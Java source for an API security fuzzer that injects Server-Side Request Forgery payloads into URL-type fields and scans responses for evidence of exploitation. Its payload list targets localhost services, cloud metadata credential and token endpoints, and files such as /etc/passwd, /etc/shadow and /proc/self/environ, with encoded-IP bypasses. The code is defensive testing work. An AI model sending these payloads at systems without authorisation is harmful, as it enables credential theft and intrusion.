package com.endava.cats.fuzzer.fields;

import com.endava.cats.annotations.FieldFuzzer;
import com.endava.cats.fuzzer.api.Fuzzer;
import com.endava.cats.fuzzer.executor.SimpleExecutor;
import com.endava.cats.fuzzer.executor.SimpleExecutorContext;
import com.endava.cats.http.HttpMethod;
import com.endava.cats.http.ResponseCodeFamily;
import com.endava.cats.http.ResponseCodeFamilyPredefined;
import com.endava.cats.model.CatsResponse;
import com.endava.cats.model.FuzzingData;
import com.endava.cats.report.TestCaseListener;
import com.endava.cats.util.CatsModelUtils;
import com.endava.cats.util.CatsUtil;
import com.endava.cats.util.ConsoleUtils;
import com.endava.cats.util.JsonUtils;
import io.github.ludovicianul.prettylogger.PrettyLogger;
import io.github.ludovicianul.prettylogger.PrettyLoggerFactory;
import jakarta.inject.Singleton;

import java.util.List;
import java.util.Locale;
import java.util.Set;
import java.util.stream.Collectors;

/**
 * Fuzzer that sends SSRF (Server-Side Request Forgery) payloads in URL-type fields.
 * <p>
 * This fuzzer tests for SSRF vulnerabilities by sending payloads targeting internal
 * services, cloud metadata endpoints, and local resources. It specifically targets
 * fields with URI/URL format or field names suggesting URL content.
 * </p>
 */
@Singleton
@FieldFuzzer
public class SSRFInUrlFieldsFuzzer implements Fuzzer {
    private final PrettyLogger logger = PrettyLoggerFactory.getLogger(getClass());
    private final SimpleExecutor simpleExecutor;
    private final TestCaseListener testCaseListener;

    private static final List<String> URL_FIELD_PATTERNS = List.of(
            "url", "uri", "link", "href", "endpoint", "callback", "webhook",
            "redirect", "return", "next", "target", "dest", "destination",
            "path", "file", "image", "avatar", "icon", "logo", "source"
    );

    private static final List<String> SSRF_PAYLOADS = List.of(
            // Localhost variations
            "http://localhost",
            "http://localhost:80",
            "http://localhost:443",
            "http://localhost:22",
            "http://localhost:3306",
            "http://localhost:5432",
            "http://localhost:6379",
            "http://localhost:27017",
            "http://127.0.0.1",
            "http://127.0.0.1:80",
            "http://127.0.0.1:8080",
            "http://127.0.0.1:8443",
            "http://[::1]",
            "http://[0:0:0:0:0:0:0:1]",
            "http://0.0.0.0",
            "http://0",
            "http://127.1",
            "http://127.0.1",
            // AWS metadata
            "http://169.254.169.254/",
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data/",
            "http://169.254.169.254/latest/dynamic/instance-identity/document",
            // GCP metadata
            "http://metadata.google.internal/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            // Azure metadata
            "http://169.254.169.254/metadata/instance",
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            // Internal services
            "http://internal-service.local",
            "http://internal.company.com",
            "http://intranet",
            "http://admin.internal",
            // File protocol
            "file:///etc/passwd",
            "file:///etc/shadow",
            "file:///etc/hosts",
            "file:///proc/self/environ",
            "file:///c:/windows/system32/drivers/etc/hosts",
            // DNS rebinding / bypass attempts
            "http://localtest.me",
            "http://spoofed.burpcollaborator.net",
            "http://127.0.0.1.nip.io",
            // Encoded variations
            "http://0x7f000001",
            "http://2130706433",
            "http://017700000001"
    );


    /**
     * Creates a new SSRFInUrlFieldsFuzzer instance.
     *
     * @param simpleExecutor   the executor used to run the fuzz logic
     * @param testCaseListener the test case listener for reporting results
     */
    public SSRFInUrlFieldsFuzzer(SimpleExecutor simpleExecutor, TestCaseListener testCaseListener) {
        this.simpleExecutor = simpleExecutor;
        this.testCaseListener = testCaseListener;
    }

    @Override
    public void fuzz(FuzzingData data) {
        if (JsonUtils.isEmptyPayload(data.getPayload())) {
            logger.skip("Skip fuzzer as payload is empty");
            return;
        }

        Set<String> urlFields = getUrlFields(data);

        if (urlFields.isEmpty()) {
            logger.skip("No URL-type fields found in the request");
            return;
        }

        logger.info("Found {} URL-type field(s) to test for SSRF", urlFields.size());

        for (String field : urlFields) {
            fuzzField(data, field);
        }
    }

    private void fuzzField(FuzzingData data, String field) {
        List<String> payloads = getPayloadsToUse();
        for (String payload : payloads) {
            String fuzzedPayload = CatsUtil.justReplaceField(data.getPayload(), field, payload).json();

            simpleExecutor.execute(
                    SimpleExecutorContext.builder()
                            .expectedResponseCode(ResponseCodeFamilyPredefined.FOURXX)
                            .fuzzingData(data)
                            .logger(logger)
                            .scenario("Send SSRF payload in URL field [%s]: [%s]"
                                    .formatted(field, truncatePayload(payload)))
                            .fuzzer(this)
                            .payload(fuzzedPayload)
                            .responseProcessor((response, fuzzingData) -> processResponse(response, fuzzingData, payload))
                            .build()
            );
        }
    }

    private List<String> getPayloadsToUse() {
        return SSRF_PAYLOADS;
    }

    private void processResponse(CatsResponse response, FuzzingData data, String payload) {
        int responseCode = response.getResponseCode();

        SSRFDetectionResult detectionResult = detectSSRFEvidence(response, payload);
        if (detectionResult.vulnerable()) {
            testCaseListener.reportResultError(
                    logger, data, detectionResult.title(),
                    detectionResult.message());
            return;
        }

        if (ResponseCodeFamily.is5xxCode(responseCode)) {
            testCaseListener.reportResultError(
                    logger, data, "Server error with SSRF payload",
                    "Server returned %d error when processing SSRF payload. This may indicate the server attempted to connect to the target."
                            .formatted(responseCode));
            return;
        }

        if (ResponseCodeFamily.is4xxCode(responseCode)) {
            testCaseListener.reportResultInfo(
                    logger, data, "SSRF payload rejected",
                    "Server properly rejected the SSRF payload with response code %d"
                            .formatted(responseCode));
            return;
        }

        if (ResponseCodeFamily.is2xxCode(responseCode)) {
            testCaseListener.reportResultInfo(
                    logger, data, "SSRF payload accepted",
                    "SSRF payload was accepted (response code %d). No SSRF indicators found in response."
                            .formatted(responseCode));
            return;
        }

        testCaseListener.reportResultError(
                logger, data, "Unexpected response code",
                "Received unexpected response code %d for SSRF payload"
                        .formatted(responseCode));
    }

    /**
     * Gets fields that are likely to contain URLs based on schema format or field name.
     */
    private Set<String> getUrlFields(FuzzingData data) {
        return data.getAllFieldsByHttpMethod()
                .stream()
                .filter(field -> JsonUtils.isFieldInJson(data.getPayload(), field))
                .filter(field -> isUrlField(field, data))
                .collect(Collectors.toSet());
    }

    private boolean isUrlField(String fieldName, FuzzingData data) {
        var schema = data.getRequestPropertyTypes().get(fieldName);

        if (schema != null && CatsModelUtils.isUriSchema(schema)) {
            return true;
        }

        if (schema != null && CatsModelUtils.isUrlSchema(schema)) {
            return true;
        }

        String lowerFieldName = fieldName.toLowerCase(Locale.ROOT);
        return URL_FIELD_PATTERNS.stream()
                .anyMatch(lowerFieldName::contains);
    }

    /**
     * Detects evidence of SSRF vulnerability based on response analysis.
     * This method implements sophisticated detection logic beyond simple pattern matching.
     *
     * @param response the HTTP response to analyze
     * @param payload  the SSRF payload that was sent
     * @return detection result indicating if vulnerability was found
     */
    private SSRFDetectionResult detectSSRFEvidence(CatsResponse response, String payload) {
        String responseBody = response.getBody() != null ? response.getBody() : "";
        String responseLower = responseBody.toLowerCase(Locale.ROOT);
        int responseCode = response.getResponseCode();

        if (responseBody.contains(payload)) {
            return SSRFDetectionResult.vulnerable(
                    "SSRF payload reflected in response",
                    "The SSRF payload [%s] was reflected in the response body. This indicates the server processed the URL and may have attempted to connect to it. Response code: %d"
                            .formatted(truncatePayload(payload), responseCode));
        }

        SSRFDetectionResult cloudMetadataResult = checkCloudMetadataPatterns(responseLower, responseCode);
        if (cloudMetadataResult.vulnerable()) {
            return cloudMetadataResult;
        }

        SSRFDetectionResult fileContentResult = checkFileContentPatterns(responseLower, responseCode);
        if (fileContentResult.vulnerable()) {
            return fileContentResult;
        }

        SSRFDetectionResult networkErrorResult = checkNetworkErrorPatterns(responseLower, responseCode);
        if (networkErrorResult.vulnerable()) {
            return networkErrorResult;
        }

        SSRFDetectionResult dnsErrorResult = checkDnsErrorPatterns(responseLower, responseCode);
        if (dnsErrorResult.vulnerable()) {
            return dnsErrorResult;
        }

        SSRFDetectionResult httpClientErrorResult = checkHttpClientErrorPatterns(responseLower, responseCode);
        if (httpClientErrorResult.vulnerable()) {
            return httpClientErrorResult;
        }

        SSRFDetectionResult internalTargetResult = checkInternalTargetReflection(responseLower, payload, responseCode);
        if (internalTargetResult.vulnerable()) {
            return internalTargetResult;
        }

        return SSRFDetectionResult.notVulnerable();
    }

    private SSRFDetectionResult checkCloudMetadataPatterns(String responseLower, int responseCode) {
        return checkPatternMatch(responseLower,
                List.of("ami-id", "instance-id", "security-credentials", "iam/security-credentials",
                        "computemetadata", "service-accounts/default", "subscriptionid", "resourcegroupname"),
                "Cloud metadata service accessed",
                "Response contains cloud metadata indicator [%s]. This strongly suggests successful SSRF to cloud metadata service. Response code: %d",
                responseCode);
    }

    private SSRFDetectionResult checkFileContentPatterns(String responseLower, int responseCode) {
        return checkPatternMatch(responseLower,
                List.of("root:x:0:0", "root:*:0:0", "/bin/bash", "/bin/sh", "/etc/passwd", "/etc/shadow"),
                "File content exposed via SSRF",
                "Response contains file system content indicator [%s]. This indicates successful file:// protocol SSRF. Response code: %d",
                responseCode);
    }

    private SSRFDetectionResult checkNetworkErrorPatterns(String responseLower, int responseCode) {
        return checkPatternMatch(responseLower,
                List.of("connection refused", "connection timed out", "no route to host", "network unreachable"),
                "Network error reveals SSRF attempt",
                "Response contains network error [%s] indicating the server attempted to connect to the SSRF target. Response code: %d",
                responseCode);
    }

    private SSRFDetectionResult checkDnsErrorPatterns(String responseLower, int responseCode) {
        return checkPatternMatch(responseLower,
                List.of("could not resolve host", "getaddrinfo", "name or service not known"),
                "DNS resolution error reveals SSRF attempt",
                "Response contains DNS error [%s] indicating the server attempted to resolve the SSRF target hostname. Response code: %d",
                responseCode);
    }

    private SSRFDetectionResult checkHttpClientErrorPatterns(String responseLower, int responseCode) {
        return checkPatternMatch(responseLower,
                List.of("curl error", "urlopen error", "socket error", "failed to connect"),
                "HTTP client error reveals SSRF attempt",
                "Response contains HTTP client error [%s] indicating the server attempted to make an outbound request. Response code: %d",
                responseCode);
    }

    private SSRFDetectionResult checkInternalTargetReflection(String responseLower, String payload, int responseCode) {
        String payloadLower = payload.toLowerCase(Locale.ROOT);
        for (String pattern : List.of("localhost", "127.0.0.1", "0.0.0.0", "169.254.169.254", "metadata.google.internal", "metadata.azure.com")) {
            if (responseLower.contains(pattern) && payloadLower.contains(pattern)) {
                return SSRFDetectionResult.vulnerable(
                        "Internal target reflected in response",
                        "Response contains internal target [%s] from the SSRF payload. This may indicate the server processed the internal URL. Response code: %d"
                                .formatted(pattern, responseCode));
            }
        }
        return SSRFDetectionResult.notVulnerable();
    }

    private SSRFDetectionResult checkPatternMatch(String responseLower, List<String> patterns, String title, String messageTemplate, int responseCode) {
        for (String pattern : patterns) {
            if (responseLower.contains(pattern)) {
                return SSRFDetectionResult.vulnerable(title, messageTemplate.formatted(pattern, responseCode));
            }
        }
        return SSRFDetectionResult.notVulnerable();
    }

    private String truncatePayload(String payload) {
        return payload.length() > 50 ? payload.substring(0, 50) + "..." : payload;
    }

    @Override
    public List<HttpMethod> skipForHttpMethods() {
        return List.of(HttpMethod.HEAD, HttpMethod.TRACE);
    }

    @Override
    public String description() {
        return "iterate through URL-type fields and send SSRF payloads to detect Server-Side Request Forgery vulnerabilities";
    }

    @Override
    public String toString() {
        return ConsoleUtils.sanitizeFuzzerName(this.getClass().getSimpleName());
    }

    /**
     * Result of SSRF detection analysis.
     */
    private record SSRFDetectionResult(boolean vulnerable, String title, String message) {

        private static SSRFDetectionResult notVulnerable() {
            return new SSRFDetectionResult(false, null, null);
        }

        private static SSRFDetectionResult vulnerable(String title, String message) {
            return new SSRFDetectionResult(true, title, message);
        }

    }
}
